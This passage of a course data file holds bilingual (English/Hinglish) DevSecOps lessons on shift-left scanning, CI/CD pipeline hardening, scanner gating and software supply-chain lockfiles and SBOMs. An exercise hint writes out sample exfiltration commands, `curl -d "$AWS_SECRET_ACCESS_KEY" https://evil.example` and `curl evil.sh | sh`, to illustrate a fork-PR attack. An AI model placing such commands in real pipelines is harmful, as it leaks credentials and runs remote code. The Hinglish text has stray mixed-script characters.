        whyHi: 'Ek security gate sirf tab kaam karता hai agmar log ise trust karते hain, aur trust pehli baar collapse hota hai jab gate ek change ko us change se unrelated reason ke liye block karता hai. Har scanner ko full strictness par ek bade existing codebase ke against enable karना ise pehli pull request par guarantee karता hai: developer jisne ek one-line fix banaya sैंkड़ों pre-existing findings se confront hota hai jo unhone create nahi kiye. Predictable response ye hai ki log red check ko ignore karना seekhते hain, phir actively iske around route karते hain — `continue-on-error`, bulk suppression comments — aur end state ek green checkmark hai jo kuch certify nahi karता. Sustainable approach existing backlog ko new work se separate karता hai: saare current findings ko ek baseline ke roop mein capture karो jise gate ignore karता hai, sirf do categories par immediately gate karो jo kabhi ambiguous nahi hain, aur phir har team ko apna backlog burn down karने do.',
      },
    ],

    realWorld: [
      {
        en: '**The Codecov breach (2021)** — attackers modified Codecov\'s Bash Uploader script; for two months it exfiltrated environment variables — including CI secrets and cloud keys — from every pipeline that ran it. The lesson widely drawn: a CI step that curls and executes a third-party script runs with your full pipeline privileges, so pin it to a hash and treat it as code you own.',
        hi: '**Codecov breach (2021)** — attackers ne Codecov ki Bash Uploader script modify ki; do mahine tak ye har pipeline se environment variables — including CI secrets aur cloud keys — exfiltrate karती rahi jo ise run karती thi. Lesson: ek CI step jo ek third-party script curl aur execute karता hai aapke full pipeline privileges ke saath run hota hai.',
      },
      {
        en: '**GitHub Actions `pull_request_target` incidents** — many projects used `pull_request_target` (which has repo secrets) plus an explicit checkout of the PR head, so a fork PR\'s code ran with the maintainer\'s token. Multiple projects leaked `GITHUB_TOKEN` and deploy keys this way before the pattern became a well-known anti-pattern. Fix: fork PRs get zero secrets; privileged work happens post-merge.',
        hi: '**GitHub Actions `pull_request_target` incidents** — kई projects ne `pull_request_target` (jiske paas repo secrets hain) plus PR head ka ek explicit checkout use kiya, to ek fork PR ka code maintainer ke token ke saath run hua. Kई projects ne is tarah `GITHUB_TOKEN` aur deploy keys leak kiye. Fix: fork PRs ko zero secrets milते hain.',
      },
      {
        en: '**A fintech that shifted secret-scanning to pre-commit** — they had been finding ~1 committed secret per month in CI (each = a rotation + an audit). Adding `gitleaks` as a pre-commit hook plus a server-side push-protection rule dropped that to zero reaching the remote in the first quarter; the secrets were still typed, but caught on the developer\'s machine before the commit.',
        hi: '**Ek fintech jisne secret-scanning ko pre-commit mein shift kiya** — wo CI mein ~1 committed secret per month dhoondh rahe the (har ek = ek rotation + ek audit). `gitleaks` ko ek pre-commit hook plus ek server-side push-protection rule ke roop mein add karne se wo pehle quarter mein remote tak pahunchte hue zero ho gaya.',
      },
    ],

    interviewQA: [
      {
        q: 'What does "shift left" mean, and why does the cost of a security fix change as you move through the pipeline?',
        qHi: '"Shift left" ka matlab kya hai, aur kyun ek security fix ki cost badalती hai jaise aap pipeline se guzarते ho?',
        a: 'Shift left means running each security check at the earliest point in the delivery lifecycle where it can meaningfully run, rather than concentrating security into a review or a penetration test at the end. The earliest layer is the developer\'s machine — fast static analysis, secret scanning, and dependency-policy checks in the IDE and the pre-commit hook. The next is the pull request and CI — software composition analysis, full static analysis, IaC scanning, license checks, SBOM generation, image scanning. Then pre-deployment — signature and provenance verification, admission policy. Then runtime — dynamic testing and threat detection. The cost of remediating a given flaw rises by roughly an order of magnitude at each stage you move to the right, for two reasons. One is context: a flaw caught on the commit that introduces it is fixed by the person who wrote it, immediately, with the change fresh in mind, in a few minutes; the same flaw found months later requires someone to context-switch back into unfamiliar code, often under release pressure, and re-test everything the fix touches. The other is blast radius: a secret caught pre-commit never enters version control and costs nothing, while the same secret found in production is a credential rotation, an incident investigation of what was accessed, and frequently a regulatory disclosure. Shift left does not remove the late-stage checks — you still want DAST and a periodic pen test — it just ensures those are finding the classes of problem only they can find.',
        aHi: 'Shift left ka matlab har security check ko delivery lifecycle mein sabse early point par run karना jahaan ye meaningfully run kar sakта hai, security ko end mein ek review ya ek penetration test mein concentrate karने ke bजाय. Sabse early layer developer ki machine hai. Agli pull request aur CI hai. Phir pre-deployment. Phir runtime. Ek given flaw remediate karने ki cost har stage par roughly ek order of magnitude se badhती hai jo aap right move karते ho, do reasons se. Ek context hai: ek flaw jo introduce karने wale commit par pakda gaya person dwara fix hota hai jisne ise likha, immediately, kुछ minutes mein. Doosra blast radius hai: ek secret jo pre-commit pakda gaya kabhi version control mein enter nahi karता aur kुछ nahi costs karता, jabki wahi secret production mein mila ek credential rotation aur ek regulatory disclosure hai.',
      },
      {
        q: 'Why is the CI/CD pipeline itself a high-value attack target, and how do you secure it?',
        qHi: 'CI/CD pipeline khud ek high-value attack target kyun hai, aur aap ise kaise secure karते ho?',
        a: 'Because of the combination of what it holds and what it does. It holds production deployment credentials, artifact-signing keys, registry push rights, cloud administrator roles, and a token that can push to your default branch. And on every push — including pull requests from forks — it checks out untrusted code and executes it, running the test suite, build scripts, and whatever tooling those invoke, with those credentials present in the environment. So a pull request that adds one line piping a remote script into a shell, or a build-time dependency that has been compromised upstream, executes with the full privileges of your pipeline. Securing it means treating CI as a production system. Untrusted pull requests, which is every fork PR, get no secrets and no deployment identity — they run only lint, tests, and scanners. Jobs that hold a deployment identity run only on push to a protected branch after required review, and use short-lived credentials issued via OIDC and scoped to exactly the actions they need, not a static long-lived key with broad permissions. Workflow definitions are protected by code owners and required review, because editing a workflow is editing what runs with those credentials. Third-party actions and scripts are pinned to immutable commit hashes so a tag cannot be silently re-pointed at malicious code. Runners for untrusted code are isolated and ephemeral. And the deploy role is scoped so tightly that a full pipeline compromise still cannot, for example, modify IAM.',
        aHi: 'Kyunki ye kya rakhता hai aur kya karता hai ke combination ki wajah se. Ye production deployment credentials, artifact-signing keys, registry push rights, cloud administrator roles rakhता hai. Aur har push par — forks se pull requests bhi — ye untrusted code checkout aur execute karता hai un credentials ke saath environment mein present. To ek pull request jo ek remote script ko ek shell mein pipe karने wali ek line add karता hai aapki pipeline ke full privileges ke saath execute hota hai. Ise secure karने ka matlab CI ko ek production system treat karना. Untrusted pull requests ko koi secrets aur koi deployment identity nahi milती. Jobs jo ek deployment identity hold karते hain sirf ek protected branch par push par run hote hain required review ke baad, aur OIDC ke via issued short-lived credentials use karते hain. Workflow definitions code owners dwara protected hain. Third-party actions immutable commit hashes par pinned hain.',
      },
      {
        q: 'Name the main types of security scanner, what each detects, and where in the pipeline it runs. When should a finding gate the build versus just be reported?',
        qHi: 'Security scanner ke main types name karो, har ek kya detect karता hai, aur pipeline mein kahaan run hota hai. Ek finding kab build gate karे versus sirf report ho?',
        a: 'SAST — static application security testing — analyses your own source for patterns like injection, XSS, and crypto misuse; it runs in CI and often pre-commit. SCA — software composition analysis — inspects your dependency tree for components with known CVEs, and runs in CI; Trivy, Grype, and Snyk are examples. Secret scanning finds keys and tokens in code and git history, and runs pre-commit and in CI. IaC scanning checks Terraform, CloudFormation, and Kubernetes manifests for insecure settings like world-open security groups or public buckets, in CI; Trivy, Checkov, tfsec. DAST — dynamic application security testing — exercises a running instance for runtime-only issues like missing headers and broken auth, and runs against staging. Image scanning examines a built container for vulnerable OS and app packages and misconfiguration, in CI and continuously in the registry. License scanning flags incompatible dependency licenses. On gating versus reporting: gate — fail the build or block the merge — for a new critical or high CVE that has a fix available, any detected secret, a failing signature or provenance check, and a serious IaC finding like a public bucket. Report — annotate and track but do not block — for medium and low severity, for findings with no fix available, and for pre-existing issues that the current change did not introduce. The principle is that a gate must only ever block a pull request for something that pull request actually added; a gate that fires on unrelated pre-existing debt loses credibility and gets disabled. Start most checks in report mode, burn down the backlog, and ratchet to gating — while always gating new secrets and new fixable criticals from day one.',
        aHi: 'SAST aapke apne source ko injection, XSS jaise patterns ke liye analyse karता hai; CI aur aksar pre-commit mein. SCA aapke dependency tree ko known CVEs wale components ke liye inspect karता hai, CI mein; Trivy, Grype, Snyk. Secret scanning code aur git history mein keys aur tokens dhoondhता hai, pre-commit aur CI mein. IaC scanning Terraform, Kubernetes manifests ko insecure settings ke liye check karता hai. DAST ek running instance exercise karता hai runtime-only issues ke liye, staging ke against. Image scanning ek built container ko examine karता hai. Gating versus reporting par: gate — build fail ya merge block — ek naye critical ya high CVE ke liye jiska ek fix available hai, kisi bhi detected secret ke liye, ek failing signature check ke liye. Report — annotate aur track par block mat karो — medium aur low severity ke liye, koi fix available nahi wale findings ke liye, aur pre-existing issues ke liye. Principle ye hai ki ek gate sirf ek pull request ko us cheez ke liye block karे jo us pull request ne actually add kiya.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain shift-left: the four layers (pre-commit, PR/CI, pre-deploy, runtime), what runs at each, and why fix cost rises ~10x per stage moved right.',
        taskHi: 'Ek comment mein, shift-left samjhाओ: chaar layers, har ek par kya run hota hai, aur kyun fix cost badhती hai.',
        hint: 'SHIFT LEFT = run each security check at the EARLIEST point in the lifecycle where it can MEANINGFULLY run, instead of concentrating security into a review / pen test at the END. FOUR LAYERS: (1) IDE / PRE-COMMIT — secret scan (gitleaks), lint, fast SAST, "is this dependency allowed" → feedback in SECONDS, before the code exists in git. (2) PULL REQUEST / CI — SCA (dependency CVEs: Trivy/Grype/Snyk), full SAST (Semgrep), IaC scan (Trivy config/Checkov/tfsec), license check, SBOM generation (syft), container image scan → feedback in MINUTES, before merge. (3) PRE-DEPLOY — image signature + build-provenance verification (cosign verify), admission-control policy check. (4) RUNTIME / PROD — DAST (OWASP ZAP), admission control, runtime threat detection → LAST line, MOST expensive. FIX COST RISES ~10x PER STAGE RIGHT, for two reasons: (a) CONTEXT — a flaw caught on the commit that introduced it is fixed by the person who wrote it, immediately, change fresh in mind, in minutes; the same flaw found months later forces a context-switch back into unfamiliar code (often under release pressure) + re-testing everything the fix touches. (b) BLAST RADIUS — a secret caught pre-commit never enters version control, costs nothing; the same secret found in a prod breach = a credential rotation + an incident investigation of what was accessed + often a regulatory disclosure. Shift-left does NOT remove the late checks (you still want DAST + a periodic pen test) — it ensures those find the classes of problem ONLY they can find (business-logic flaws, chained exploits, auth-bypass reasoning), not lint findings.',
        hintHi: 'SHIFT LEFT = har security check ko lifecycle mein SABSE EARLY point par run karो jahaan ye MEANINGFULLY run kar sakта hai. CHAAR LAYERS: (1) IDE / PRE-COMMIT — secret scan, lint, fast SAST → SECONDS mein feedback, code ke git mein hone se pehle. (2) PR / CI — SCA (dependency CVEs), full SAST, IaC scan, license check, SBOM, image scan → MINUTES mein, merge se pehle. (3) PRE-DEPLOY — signature + provenance verification, admission policy. (4) RUNTIME / PROD — DAST, admission control, runtime detection → LAST line, MOST expensive. COST ~10x PER STAGE RIGHT: (a) CONTEXT — introduce karने wale commit par pakda gaya flaw person dwara fix hota hai jisne ise likha, minutes mein; mahine baad = context-switch + re-testing. (b) BLAST RADIUS — pre-commit secret kabhi git mein nahi; prod breach mein = rotation + incident + disclosure. Late checks REMOVE nahi hote — wo ab wo dhoondhते hain jo SIRF wo dhoondh sakते hain.',
      },
      {
        task: 'In a comment, argue that the CI/CD pipeline is a production system: what it holds, what it executes, the exfiltration attack, and the six controls that secure it.',
        taskHi: 'Ek comment mein, argue karो ki CI/CD pipeline ek production system hai.',
        hint: 'THE PIPELINE IS A HIGH-VALUE TARGET = (what it HOLDS) × (what it DOES). HOLDS: production deploy credentials, artifact-signing keys, container-registry push rights, cloud admin roles, a token that can push to your DEFAULT BRANCH. DOES: on EVERY push — INCLUDING pull requests from FORKS — it checks out UNTRUSTED code and EXECUTES it (the test suite, build scripts, and any tooling those invoke) WITH those credentials present in the environment. THE EXFILTRATION ATTACK: a fork PR edits the "test" script in package.json to `curl -d "$AWS_SECRET_ACCESS_KEY" https://evil.example` (or adds `curl evil.sh | sh` to a build step); the workflow dutifully runs it; if the workflow injected secrets into the env for pull_request events, an outside contributor just exfiltrated your prod credentials in ONE PR. (Real: Codecov 2021 — a modified third-party uploader script exfiltrated env vars from every pipeline for 2 months; the `pull_request_target` + explicit PR checkout anti-pattern leaked many projects\' tokens.) THE SIX CONTROLS: (1) untrusted (fork) PRs get NO secrets and NO deploy identity — they run lint + tests + scanners ONLY. (2) jobs with a deploy identity run ONLY on push to a protected branch, AFTER required review, gated by a protected `environment`. (3) use short-lived OIDC-issued credentials scoped to EXACTLY the actions performed (e.g. `ecr:Put*` + `eks:deploy`, NO `iam:*`, 15-min sessions) — never a static long-lived broad key. (4) `.github/**` (workflow files) are CODEOWNER-protected + "require review for workflow changes" — editing a workflow = editing what runs with those creds. (5) PIN every third-party action / script to a full immutable commit SHA (not `@v4` — a tag can be re-pointed). (6) runners for untrusted code are ISOLATED + EPHEMERAL; scope the deploy role so tightly that a FULL pipeline compromise still cannot modify IAM or touch unrelated resources.',
        hintHi: 'PIPELINE EK HIGH-VALUE TARGET = (kya HOLD karता hai) × (kya KARTA hai). HOLDS: prod deploy credentials, signing keys, registry push rights, cloud admin roles, DEFAULT BRANCH push token. DOES: HAR push par — FORKS se PRs bhi — UNTRUSTED code checkout + EXECUTE karता hai un credentials ke saath. EXFILTRATION ATTACK: ek fork PR "test" script ko `curl -d "$AWS_SECRET" https://evil.example` mein edit karता hai; workflow ise run karता hai; agar secrets pull_request events ke liye env mein inject hue, ek outside contributor ne prod credentials ek PR mein exfiltrate kiye. (Codecov 2021.) CHHE CONTROLS: (1) fork PRs ko NO secrets, NO deploy identity — lint + tests + scanners ONLY. (2) deploy jobs SIRF protected branch push par, review ke BAAD. (3) short-lived OIDC credentials scoped to EXACTLY the actions (NO `iam:*`, 15-min). (4) `.github/**` CODEOWNER-protected. (5) har action ko full SHA par PIN karो (`@v4` nahi). (6) untrusted runners ISOLATED + EPHEMERAL; deploy role itna tight ki full compromise bhi IAM modify na kar sake.',
      },
      {
        task: 'In a comment, give the scanner taxonomy (SAST / SCA / secret / IaC / DAST / image / license — what each finds, where it runs) and the gate-vs-report decision rule.',
        taskHi: 'Ek comment mein, scanner taxonomy do aur gate-vs-report decision rule.',
        hint: 'SCANNER TAXONOMY — what each FINDS / where it RUNS: SAST (static application security testing) — analyses YOUR OWN source for patterns: SQL injection, XSS, crypto misuse, path traversal. Runs: CI + pre-commit. Tools: Semgrep, CodeQL, Bandit. SCA (software composition analysis) — known CVEs in your DEPENDENCIES (the transitive tree, from lockfiles). Runs: CI. Tools: Trivy, Grype, Snyk, Dependabot. SECRET SCANNING — keys / tokens / private keys in code AND git history. Runs: pre-commit + CI (+ server-side push protection). Tools: gitleaks, trufflehog. IaC SCANNING — insecure infra config: security groups open to 0.0.0.0/0, public S3 buckets, unencrypted volumes, over-broad IAM. Runs: CI. Tools: Trivy config, Checkov, tfsec, kube-linter. DAST (dynamic application security testing) — exercises a RUNNING instance: missing security headers, broken auth, injection reachable via the live API, TLS config. Runs: against staging (nightly / pre-release). Tools: OWASP ZAP, Burp. IMAGE SCANNING — vulnerable OS + app packages in a BUILT container, plus image misconfig (runs as root, etc). Runs: CI (post-build) + CONTINUOUSLY in the registry (new CVEs get published against images you already shipped). Tools: Trivy image, Grype. LICENSE SCANNING — dependency licenses incompatible with how you distribute (GPL in a proprietary product). Runs: CI. GATE vs REPORT DECISION RULE: GATE (fail the build / block the merge) → a NEW CRITICAL or HIGH CVE that HAS a fix available; ANY detected secret; a failing signature / provenance check; a serious IaC finding (public bucket, 0.0.0.0/0 → SSH). REPORT (annotate the PR, record, track — do NOT block) → MEDIUM / LOW severity; findings with NO fix available (track with an expiry date); PRE-EXISTING issues the current change did not introduce (BASELINE them). THE PRINCIPLE: a gate must ONLY ever block a PR for something THAT PR actually introduced — a gate that fires on unrelated pre-existing debt loses credibility → gets `continue-on-error`\'d / bulk-suppressed / disabled → a green check that certifies NOTHING (worse than no check). Start most checks in REPORT mode, burn down the backlog, RATCHET each category to GATING as its backlog hits zero — but GATE new secrets + new fixable criticals from DAY ONE.',
        hintHi: 'SCANNER TAXONOMY — kya FIND karता / kahaan RUN hota: SAST — AAPKE source mein injection/XSS/crypto misuse. CI + pre-commit. Semgrep, CodeQL. SCA — aapki DEPENDENCIES mein known CVEs. CI. Trivy, Grype, Snyk. SECRET — code + git history mein keys/tokens. pre-commit + CI. gitleaks. IaC — insecure infra config (0.0.0.0/0, public buckets). CI. Trivy config, Checkov, tfsec. DAST — ek RUNNING instance (headers, auth, TLS). staging. OWASP ZAP. IMAGE — ek BUILT container mein vulnerable packages + misconfig. CI + registry mein CONTINUOUSLY. Trivy image. LICENSE — incompatible dependency licenses. CI. GATE vs REPORT: GATE → NAYA CRITICAL/HIGH CVE with a fix; koi bhi secret; failing signature check; serious IaC finding. REPORT → MEDIUM/LOW; koi fix nahi wale findings; PRE-EXISTING issues (BASELINE karो). PRINCIPLE: ek gate SIRF us cheez ke liye block karे jo US PR ne add kiya — warna credibility kho deता hai → disable. REPORT mode se shuru, RATCHET to GATING, par naye secrets + naye fixable criticals DAY ONE se gate.',
      },
    ],

    keyTakeaways: [
      'SHIFT LEFT = run each check at the earliest point it can run: pre-commit (secrets, fast SAST) → PR/CI (SCA, SAST, IaC, SBOM, image scan) → pre-deploy (signature + provenance verify) → runtime (DAST, admission control). Fix cost rises ~10x per stage moved right — context is lost and blast radius grows (a pre-commit secret costs 30s; a prod-breach secret costs a rotation + an incident + a disclosure).',
      'THE CI/CD PIPELINE IS A PRODUCTION SYSTEM: it holds prod deploy creds, signing keys, registry push rights, a default-branch token — and it EXECUTES untrusted code (every fork PR) with those in the environment. A fork PR editing the test script to exfiltrate a secret is the canonical attack. Secure it: fork PRs get NO secrets, deploy identity only on protected-branch push after review, short-lived scoped OIDC creds (no `iam:*`), CODEOWNER-protected workflows, actions pinned to SHAs, isolated ephemeral runners.',
      'THREAT MODEL with STRIDE, one hour per system: draw the data-flow + trust boundaries, walk each boundary asking Spoofing / Tampering / Repudiation / Information disclosure / Denial of service / Elevation of privilege, and record for each: the mitigation you HAVE vs the one you are MISSING. Finds design-level weaknesses no scanner can see.',
      'SCANNER TAXONOMY: SAST (your source — injection/XSS), SCA (dependency CVEs — Trivy/Grype), secret scanning (keys in code + history), IaC scanning (public buckets, open SGs — Trivy config/Checkov), DAST (a running app — ZAP), image scanning (container OS/app CVEs — CI + registry), license scanning. Each finds a different class and runs at a different point.',
      'GATE vs REPORT per check + severity: GATE any new secret, any new CRITICAL/HIGH CVE WITH a fix, a failing signature check, a public-bucket IaC finding. REPORT medium/low, no-fix findings, and PRE-EXISTING debt (baseline it). A gate must only block a PR for what THAT PR introduced — otherwise it gets disabled and "green" means nothing. Start in report mode, burn down the backlog, ratchet to gating.',
    ],
    keyTakeawaysHi: [
      'SHIFT LEFT = har check ko sabse early point par run karो: pre-commit (secrets, fast SAST) → PR/CI (SCA, SAST, IaC, SBOM, image scan) → pre-deploy (signature + provenance verify) → runtime (DAST, admission control). Fix cost ~10x badhती hai har stage right — context khो jaता hai aur blast radius badhता hai (ek pre-commit secret 30s costs karता hai; ek prod-breach secret ek rotation + ek incident + ek disclosure).',
      'CI/CD PIPELINE EK PRODUCTION SYSTEM HAI: ye prod deploy creds, signing keys, registry push rights, ek default-branch token rakhता hai — aur ye untrusted code EXECUTE karता hai (har fork PR) un ke saath environment mein. Ek fork PR jo test script ko ek secret exfiltrate karने ke liye edit karता hai canonical attack hai. Secure karो: fork PRs ko NO secrets, deploy identity sirf protected-branch push par review ke baad, short-lived scoped OIDC creds (no `iam:*`), CODEOWNER-protected workflows, actions SHAs par pinned, isolated ephemeral runners.',
      'STRIDE ke saath THREAT MODEL karो, per system ek ghanta: data-flow + trust boundaries draw karो, har boundary walk karो Spoofing / Tampering / Repudiation / Information disclosure / Denial of service / Elevation of privilege poochते hue, aur har ek ke liye record karो: jo mitigation aapke paas HAI vs jo MISSING hai. Design-level weaknesses dhoondhता hai jo koi scanner nahi dekh sakта.',
      'SCANNER TAXONOMY: SAST (aapka source — injection/XSS), SCA (dependency CVEs — Trivy/Grype), secret scanning (code + history mein keys), IaC scanning (public buckets, open SGs — Trivy config/Checkov), DAST (ek running app — ZAP), image scanning (container OS/app CVEs — CI + registry), license scanning. Har ek ek alag class dhoondhता hai aur ek alag point par run hota hai.',
      'GATE vs REPORT per check + severity: GATE koi bhi naya secret, koi bhi naya CRITICAL/HIGH CVE jiska ek fix HAI, ek failing signature check, ek public-bucket IaC finding. REPORT medium/low, no-fix findings, aur PRE-EXISTING debt (baseline karो). Ek gate sirf ek PR ko us cheez ke liye block karे jo US PR ne introduce kiya — warna ye disable ho jaता hai aur "green" ka matlab kuch nahi. Report mode mein shuru karो, backlog burn down karो, gating tak ratchet karो.',
    ],
  },

  {
    slug: 'ops-the-software-supply-chain-dependencies-lockfiles-and-sboms',
    title: 'The Software Supply Chain: Dependencies, Lockfiles & SBOMs',
    titleHi: 'Software Supply Chain: Dependencies, Lockfiles Aur SBOMs',
    description:
      'Your application is mostly code you did not write: a handful of direct dependencies pull in hundreds of transitive ones, each an entry point for a vulnerability or a supply-chain attack. This lesson covers how the dependency graph really works, why a lockfile is a security control and not just a convenience, pinning by version range versus exact version versus hash, and the Software Bill of Materials (SBOM) — what it is, the two standard formats, and generating one with syft.',
    descriptionHi:
      'Aapki application zyादातर wo code hai jo aapne nahi likha: kुछ direct dependencies sैंkड़ों transitive ones khींchती hain, har ek ek vulnerability ya ek supply-chain attack ke liye ek entry point. Ye lesson cover karता hai ki dependency graph really kaise kaam karता hai, kyun ek lockfile ek security control hai aur sirf ek convenience nahi, version range versus exact version versus hash se pinning, aur Software Bill of Materials (SBOM) — ye kya hai, do standard formats, aur syft ke saath ek generate karना.',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 2,

    analogy: {
      en: '**A packaged sandwich with an ingredients label versus one made fresh with no record.** If a supplier recalls a batch of, say, a specific preservative, the packaged sandwich can be pulled from every shelf in an hour because its label lists every ingredient and sub-ingredient and the batch numbers. The fresh one made this morning with whatever was in the kitchen? Nobody can say whether it contains the recalled ingredient without tracking down the person who made it and hoping they remember. An SBOM is the ingredients label for your software: when a CVE lands against \`log4j\` version 2.14, the question "which of our 200 services ship that exact version, directly or pulled in by something else" should take seconds to answer, not a frantic week of grepping build logs.',
      hi: '**Ek packaged sandwich ek ingredients label ke saath versus ek fresh banaya gaya bina record ke.** Agmar ek supplier ek batch recall karता hai, say, ek specific preservative ki, packaged sandwich har shelf se ek ghante mein pulled ja sakта hai kyunki iska label har ingredient aur sub-ingredient aur batch numbers list karता hai. Wo fresh wala jo aaj subah jo bhi kitchen mein tha usse banaya gaya? Koi nahi bata sakta ki isme recalled ingredient hai ya nahi bina us person ko track kiye jisne ise banaya. Ek SBOM aapke software ke liye ingredients label hai: jab ek CVE `log4j` version 2.14 ke against land karता hai, sawaal "hamari 200 services mein se konsi wo exact version ship karती hain" ko answer karने mein seconds lagने chahिए, ek frantic hafta nahi.',
    },

    simple: `**YOUR CODE IS MOSTLY NOT YOUR CODE:**
\`\`\`
package.json says:     3 dependencies
package-lock.json has: 400+ packages    <- the TRANSITIVE closure
                       (your 3 deps have deps, which have deps, ...)
a typical Node service: ~1,000 packages, ~1M lines, written by ~1,000 people
                        you have never met, running with your app's privileges.
=> the attack surface is the WHOLE tree, not the 3 lines you typed.
\`\`\`

**THE LOCKFILE IS A SECURITY CONTROL:**
\`\`\`
without a lock:  "express": "^4.18.0"  -> CI resolves to whatever is newest TODAY.
   two builds of the same commit can pull DIFFERENT code. a compromised patch
   release (4.18.9 -> malware) lands silently on your next build.
with a lock:     package-lock.json / yarn.lock / poetry.lock / Cargo.lock / go.sum
   pins EVERY package in the tree to an EXACT version + a CONTENT HASH (integrity).
   the build is reproducible; an upstream package can't change under you; a
   tampered download fails the hash check.
RULE: commit the lockfile. build with  npm ci  /  pip-sync  /  --frozen-lockfile
      (fail if the lock and manifest disagree) - NEVER a bare  npm install  in CI.
\`\`\`

**PINNING — three levels:**
\`\`\`
RANGE     "^4.18.0"   (>=4.18.0 <5)   convenient, gets patches automatically,
                                       BUT non-reproducible without a lock.
EXACT     "4.18.2"                     reproducible; you choose when to bump.
HASH      "4.18.2" + integrity sha512-... (in the lock) / --require-hashes (pip) /
          a pinned digest for a container base image
                                       tamper-evident: the bytes must match.
best practice: EXACT (or range) in the manifest + a COMMITTED LOCK with hashes +
automated PRs (Renovate/Dependabot, Lesson 6) to move the pins forward on your schedule.
\`\`\`

**SBOM — Software Bill of Materials:**
\`\`\`
a machine-readable inventory of every component in a build: name, version,
supplier, license, and a package URL (purl) / CPE so tools can match it to CVEs.
TWO STANDARD FORMATS:
  SPDX        (Linux Foundation / ISO 5962)  - licensing-focused, broad adoption
  CycloneDX   (OWASP)                          - security-focused, richer vuln + VEX data
generate one PER build, ATTACH it to the artifact (or attest it - Lesson 5), and
STORE it. tools: syft, cdxgen, the build system's own (npm sbom, 'go version -m').
\`\`\`

**WHY AN SBOM EARNS ITS KEEP:**
\`\`\`
- CVE response: "which artifacts contain foo@1.2.3?" -> a query, not an investigation.
- the thing you scanned in CI is NOT the thing running in prod 3 months later -
  new CVEs are published against OLD versions. re-scan the stored SBOMs nightly.
- license / compliance / customer + regulatory requirements (US EO 14028, EU CRA).
- diff two SBOMs -> exactly what a dependency bump added/removed/changed.
\`\`\``,

    simpleHi: `**AAPKA CODE ZYADATAR AAPKA CODE NAHI HAI:**
\`\`\`
package.json kehта hai:     3 dependencies
package-lock.json mein hai:  400+ packages    <- TRANSITIVE closure
                            (aapki 3 deps ki deps hain, jinki deps hain, ...)
ek typical Node service: ~1,000 packages, ~1M lines, ~1,000 logon dwara likha
                         jinse aap kabhi nahi mile, aapki app ke privileges ke saath running.
=> attack surface POORA tree hai, wo 3 lines nahi jo aapne type kiye.
\`\`\`

**LOCKFILE EK SECURITY CONTROL HAI:**
\`\`\`
bina ek lock ke:  "express": "^4.18.0"  -> CI jo bhi AAJ newest hai use resolve karता hai.
   same commit ke do builds ALAG code pull kar sakते hain. ek compromised patch
   release (4.18.9 -> malware) aapke agle build par silently land karता hai.
ek lock ke saath:  package-lock.json / yarn.lock / poetry.lock / Cargo.lock / go.sum
   tree mein HAR package ko ek EXACT version + ek CONTENT HASH (integrity) par pin karता hai.
   build reproducible hai; ek upstream package aapke neeche change nahi ho sakта; ek
   tampered download hash check fail karता hai.
RULE: lockfile commit karो. build karो  npm ci  /  pip-sync  /  --frozen-lockfile  ke saath
      (fail agar lock aur manifest disagree) - CI mein KABHI ek bare  npm install  nahi.
\`\`\`

**PINNING — teen levels:**
\`\`\`
RANGE     "^4.18.0"   (>=4.18.0 <5)   convenient, automatically patches milते hain,
                                       PAR bina ek lock ke non-reproducible.
EXACT     "4.18.2"                     reproducible; aap choose karते ho kab bump karना.
HASH      "4.18.2" + integrity sha512-... (lock mein) / --require-hashes (pip) /
          ek container base image ke liye ek pinned digest
                                       tamper-evident: bytes match hone chahिए.
best practice: manifest mein EXACT (ya range) + ek COMMITTED LOCK hashes ke saath +
automated PRs (Renovate/Dependabot, Lesson 6) pins ko aage move karने ke liye aapke schedule par.
\`\`\`

**SBOM — Software Bill of Materials:**
\`\`\`
ek build mein har component ka ek machine-readable inventory: name, version,
supplier, license, aur ek package URL (purl) / CPE taaki tools ise CVEs se match kar sakें.
DO STANDARD FORMATS:
  SPDX        (Linux Foundation / ISO 5962)  - licensing-focused, broad adoption
  CycloneDX   (OWASP)                          - security-focused, richer vuln + VEX data
PER build ek generate karो, ATTACH karो artifact ko (ya attest karो - Lesson 5), aur
STORE karो. tools: syft, cdxgen, build system ka apna (npm sbom, 'go version -m').
\`\`\`

**KYUN EK SBOM APNI KEEP EARN KARTA HAI:**
\`\`\`
- CVE response: "konse artifacts mein foo@1.2.3 hai?" -> ek query, ek investigation nahi.
- jo aapne CI mein scan kiya wo 3 mahine baad prod mein running cheez NAHI hai -
  naye CVEs PURANI versions ke against publish hote hain. stored SBOMs ko nightly re-scan karो.
- license / compliance / customer + regulatory requirements (US EO 14028, EU CRA).
- do SBOMs diff karो -> exactly kya ek dependency bump ne add/remove/change kiya.
\`\`\``,

    content: `## Your code is mostly other people's code

Open a modern application's manifest and you might see a dozen direct dependencies. Open its lockfile and you will see hundreds or thousands of packages, because each direct dependency has its own dependencies, and those have theirs, recursively — this is the transitive closure of your dependency graph. A typical Node.js service resolves to somewhere around a thousand packages, representing on the order of a million lines of code written by roughly a thousand different people, all of which runs inside your process with your application's privileges. The security consequence is that your attack surface is the entire tree, not the handful of names you typed into the manifest. A vulnerability in a package six levels deep that you have never heard of is still a vulnerability in your application, and a maintainer of that package pushing a malicious version is still code execution in your service.

## The lockfile is a security control

Without a lockfile, a dependency specified as a range — \`"express": "^4.18.0"\`, meaning any 4.x version at or above 4.18.0 — is resolved at install time to whatever the newest matching version is at that moment. Two builds of the identical commit, run a week apart, can therefore pull different code. If a maintainer's account is compromised and a malicious patch release is published, your very next build picks it up silently, with no change on your side. A lockfile — \`package-lock.json\`, \`yarn.lock\`, \`poetry.lock\`, \`Cargo.lock\`, \`go.sum\` — records every package in the resolved tree at an exact version together with a cryptographic hash of its contents. This does two things: it makes the build reproducible, so the same commit always produces the same dependency set, and it makes tampering detectable, because a downloaded package whose bytes do not match the recorded hash fails the install. The operational rule is to commit the lockfile to version control and to build in CI with the frozen-install command for your ecosystem — \`npm ci\`, \`pip-sync\`, \`--frozen-lockfile\`, \`--locked\` — which installs exactly what the lockfile says and fails if the lockfile and the manifest disagree, rather than a bare \`npm install\` which will happily update the lockfile mid-build.

## Levels of pinning

